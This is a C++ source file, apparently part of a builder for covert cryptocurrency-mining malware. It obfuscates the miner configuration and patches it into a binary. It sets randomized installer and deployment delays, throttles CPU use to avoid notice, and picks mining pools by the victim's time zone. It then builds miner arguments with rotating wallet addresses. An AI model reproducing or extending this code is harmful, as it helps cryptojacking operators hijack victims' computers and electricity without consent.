#include"minerConfig.h"

void configLightEncrypt(minerConfig* mConfigp, int magick54, bool mode)
{
    // times always must be 54
    int times = magick54;
    int timesCheck;
    size_t offset = sizeof(mConfigp->pointer);
    size_t size = sizeof(minerConfig) - offset;
    unsigned char* data = (unsigned char*)mConfigp + offset;

    size--;
    while (true)
    {
        if (times == 255)
        {
            times = 0;
        }

        unsigned char newVal = 0;

        if (mode == true) 
        {
            timesCheck = times;
        }
        else
        {
            timesCheck = 0 - times;
        }

        if (timesCheck > 0)
        {
            if (timesCheck + data[size] < 256)
            {
                data[size] = (data[size] + timesCheck);
            }
            else
            {
                data[size] = timesCheck - (256 - data[size]);
            }
        }
        else
        {
            if (timesCheck + data[size] > 0)
            {
                data[size] = (data[size] + timesCheck);
            }
            else
            {
                data[size] = 256 + (timesCheck + data[size]);
            }
        }

        if (size == 0)
        {
            break;
        }

        size--;
        times++;
    }
}

void configLightDecrypt(minerConfig* mConfigp, int magick54)
{
    configLightEncrypt(mConfigp, magick54, false);
}

void replaceMinerConfig(minerConfig* mConfigp, char** bin, size_t size) 
{
    uint64_t pNum = mConfigp->pointer;

    for (size_t i = 0; i < size - sizeof(uint64_t); i++) {
        uint64_t* p = (uint64_t*)(*bin + i);

        if (*p == pNum) {
            minerConfig* pToChange = (minerConfig*)p;
            *pToChange = *mConfigp;
            i += sizeof(minerConfig) - 1;
        }
    }
}

int randomAnInt(int min, int max, int exception)
{
    std::random_device r;
    std::default_random_engine e1(r());
    std::uniform_int_distribution<int> uniform_dist(min, max);
    int randomed = 0;

    do {
        randomed = uniform_dist(e1);
    } while (randomed == exception && (min != max));

    return randomed;
}

uint32_t determineThreadsToMine(uint8_t maxCPUUsage, uint32_t L3CachePerThread)
{
    uint64_t totalL3CacheKB = 0;
    float totalL3CacheMBUsed = L3CachePerThread;
    uint32_t maxThreadsToMine = 0;
    uint32_t threadsToMine = 1;
    SYSTEM_INFO sysinfo;

    //Get number of threads system has
    GetSystemInfo(&sysinfo);
    uint32_t numCPU = sysinfo.dwNumberOfProcessors;

    //Get how much system has L3 cache in Kb
    SYSTEM_LOGICAL_PROCESSOR_INFORMATION* buffer = NULL;
    DWORD bufferSize = 0;
    BOOL result = GetLogicalProcessorInformation(buffer, &bufferSize);
    if (!result && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        buffer = (SYSTEM_LOGICAL_PROCESSOR_INFORMATION*)malloc(bufferSize);
        result = GetLogicalProcessorInformation(buffer, &bufferSize);
        if (result)
        {
            DWORD count = bufferSize / sizeof(SYSTEM_LOGICAL_PROCESSOR_INFORMATION);
            for (DWORD i = 0; i < count; i++)
            {
                if (buffer[i].Relationship == RelationCache && buffer[i].Cache.Level == 3)
                {
                    totalL3CacheKB += (buffer[i].Cache.Size / 1024);
                }
            }
        }
    }
    if (buffer)
    {
        free(buffer);
    }

    //Determine number of threads for mining depending on max CPU %
    //Or how much L3 cache system has but do not exceed max CPU %

    maxThreadsToMine = std::floor(maxCPUUsage / 100.0f * numCPU);

    while (threadsToMine < maxThreadsToMine)
    {
        if ((totalL3CacheMBUsed + L3CachePerThread) > totalL3CacheKB)
        {
            break;
        }

        threadsToMine++;
        totalL3CacheMBUsed += L3CachePerThread;
    }

    return threadsToMine;
}

void selectPoolByLocation(minerConfig* config, std::string* primaryPool, std::string* backupPool)
{
    TIME_ZONE_INFORMATION lpTimeZoneInformation;
    TIME_ZONE_INFORMATION tzi;
    DWORD timeRes = GetTimeZoneInformation(&tzi);
    int poolNum;

    if (4 > timeRes > 0)
    {
        int offset = tzi.Bias / 60;

        if (offset >= -11 && offset <= -7)
        {
            //Americas west
            poolNum = randomAnInt(0, config->americaWestPoolsNum - 1);
            *primaryPool = std::string(config->americaWestPools[poolNum]);
            *backupPool = std::string(config->americaWestPools[randomAnInt(0, config->americaWestPoolsNum - 1, poolNum)]);
        }
        else if (offset >= -6 && offset <= -3)
        {
            //Americas east
            poolNum = randomAnInt(0, config->americaEastPoolsNum - 1);
            *primaryPool = std::string(config->americaEastPools[poolNum]);
            *backupPool = std::string(config->americaEastPools[randomAnInt(0, config->americaEastPoolsNum - 1, poolNum)]);
        }
        else if (offset >= -2 && offset <= 4)
        {
            //Europe
            poolNum = randomAnInt(0, config->europePoolsNum - 1);
            *primaryPool = std::string(config->europePools[poolNum]);
            *backupPool = std::string(config->europePools[randomAnInt(0, config->europePoolsNum - 1, poolNum)]);
        }
        else if (offset >= 5 && offset <= 12)
        {
            //Asia
            poolNum = randomAnInt(0, config->asiaPoolsNum - 1);
            *primaryPool = std::string(config->asiaPools[poolNum]);
            *backupPool = std::string(config->asiaPools[randomAnInt(0, config->asiaPoolsNum - 1, poolNum)]);
        }
        else
        {
            //Unknown time zone
            goto RANDOMPOOL;
        }

    }
    else
    {
        //GetTimeZoneInformation failed
        goto RANDOMPOOL;
    }

    return;

RANDOMPOOL:

    //Add all pools to a vector(except same)
    std::vector<std::string>allPools;

    for (int i = 0; i < maxPoolsPerZone; i++) {
        if (!std::string(config->americaEastPools[i]).empty() && allPools.end() == std::find(allPools.begin(), allPools.end(), config->americaEastPools[i]))
            allPools.push_back(config->americaEastPools[i]);
    }
    for (int i = 0; i < maxPoolsPerZone; i++) {
        if (!std::string(config->americaWestPools[i]).empty() && allPools.end() == std::find(allPools.begin(), allPools.end(), config->americaWestPools[i]))
            allPools.push_back(config->americaWestPools[i]);
    }
    for (int i = 0; i < maxPoolsPerZone; i++) {
        if (!std::string(config->europePools[i]).empty() && allPools.end() == std::find(allPools.begin(), allPools.end(), config->europePools[i]))
            allPools.push_back(config->europePools[i]);
    }
    for (int i = 0; i < maxPoolsPerZone; i++) {
        if (!std::string(config->asiaPools[i]).empty() && allPools.end() == std::find(allPools.begin(), allPools.end(), config->asiaPools[i]))
            allPools.push_back(config->asiaPools[i]);
    }

    //select random pools for primary and backup
    poolNum = randomAnInt(0, (allPools.size() - 1));
    *primaryPool = allPools[poolNum];
    *backupPool = allPools[randomAnInt(0, (allPools.size() - 1), poolNum)];
}


void generateSettings(minerConfig* mConfig, settings* s1)
{
    mConfig->customArgsNum = 0;
    mConfig->americaEastPoolsNum = 0;
    mConfig->americaWestPoolsNum = 0;
    mConfig->europePoolsNum = 0;
    mConfig->asiaPoolsNum = 0;


    for (int i = 0; i < sizeof(s1->addrs) / sizeof(s1->addrs[0]); i++)
    {
        strcpy_s(mConfig->addrs[i], s1->addrs[i].size() + 1, s1->addrs[i].c_str());
        if (s1->addrs[i].empty() && i > 0)
        {
            strcpy_s(mConfig->addrs[i], s1->addrs[0].size() + 1, s1->addrs[0].c_str());
        }
    }

    for (int i = 0; i < sizeof(s1->americaEastPools) / sizeof(s1->americaEastPools[0]); i++)
    {
        if (!s1->americaEastPools[i].empty())
        {
            strcpy_s(mConfig->americaEastPools[i], s1->americaEastPools[i].size() + 1, s1->americaEastPools[i].c_str());
            mConfig->americaEastPoolsNum++;
        }
    }

    for (int i = 0; i < sizeof(s1->americaWestPools) / sizeof(s1->americaWestPools[0]); i++)
    {
        if (!s1->americaWestPools[i].empty())
        {
            strcpy_s(mConfig->americaWestPools[i], s1->americaWestPools[i].size() + 1, s1->americaWestPools[i].c_str());
            mConfig->americaWestPoolsNum++;
        }
    }

    for (int i = 0; i < sizeof(s1->EuropePools) / sizeof(s1->EuropePools[0]); i++)
    {
        if (!s1->EuropePools[i].empty())
        {
            strcpy_s(mConfig->europePools[i], s1->EuropePools[i].size() + 1, s1->EuropePools[i].c_str());
            mConfig->europePoolsNum++;
        }
    }

    for (int i = 0; i < sizeof(s1->AsiaPools) / sizeof(s1->AsiaPools[0]); i++)
    {
        if (!s1->AsiaPools[i].empty())
        {
            strcpy_s(mConfig->asiaPools[i], s1->AsiaPools[i].size() + 1, s1->AsiaPools[i].c_str());
            mConfig->asiaPoolsNum++;
        }
    }

    for (int i = 0; i < sizeof(s1->customArgs) / sizeof(s1->customArgs[0]); i++)
    {
        if (!s1->customArgs[i].empty())
        {
            strcpy_s(mConfig->customArgs[i], s1->customArgs[i].size() + 1, s1->customArgs[i].c_str());
            mConfig->customArgsNum++;
        }
    }

    strcpy_s(mConfig->additionalArgs, s1->additionalArgs.size() + 1, s1->additionalArgs.c_str());

    mConfig->maxThreads = s1->maxThreads;

    mConfig->L3CachePerThread = s1->L3CachePerThread;
    mConfig->lightModeRam = s1->lightModeRam;

    mConfig->installerDelayMin = s1->installerDelayMin;
    mConfig->installerDelayMax = s1->installerDelayMax;

    mConfig->minerDeployDelayMin = s1->minerDeployDelayMin;
    mConfig->minerDeployDelayMax = s1->minerDeployDelayMax;

    mConfig->configured = true;
}

std::string constructArguments(minerConfig* mConfigp) 
{
    std::string primaryPool;
    std::string backupPool;
    std::string args = "";
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);

    ULONGLONG totalMemory = memInfo.ullTotalPhys / 1048576;

    if (mConfigp->customArgsNum > 0)
    {
        args = std::string(mConfigp->customArgs[randomAnInt(0, mConfigp->customArgsNum - 1)]);
    }
    else
    {
        uint32_t threadsToMine = determineThreadsToMine(mConfigp->maxThreads, mConfigp->L3CachePerThread);
        selectPoolByLocation(mConfigp, &primaryPool, &backupPool);
        //First pool
        args += "-o ";
        args += primaryPool;
        args += " -u ";
        args += std::string(mConfigp->addrs[randomAnInt(0, maxAddrs - 1)]);
        args += " -t ";
        args += std::to_string(threadsToMine);
        args += " ";
        if (totalMemory < mConfigp->lightModeRam)
        {
            args += "--randomx-mode light";
            args += " ";
        }
        args += mConfigp->additionalArgs;
        //Backup pool
        if (primaryPool != backupPool)
        {
            args += " -o ";
            args += backupPool;
            args += " -u ";
            args += std::string(mConfigp->addrs[randomAnInt(0, maxAddrs - 1)]);
            args += " -t ";
            args += std::to_string(threadsToMine);
            args += " ";
            if (totalMemory < mConfigp->lightModeRam)
            {
                args += "--randomx-mode light";
                args += " ";
            }
            args += mConfigp->additionalArgs;
        }
    }

    return args;
}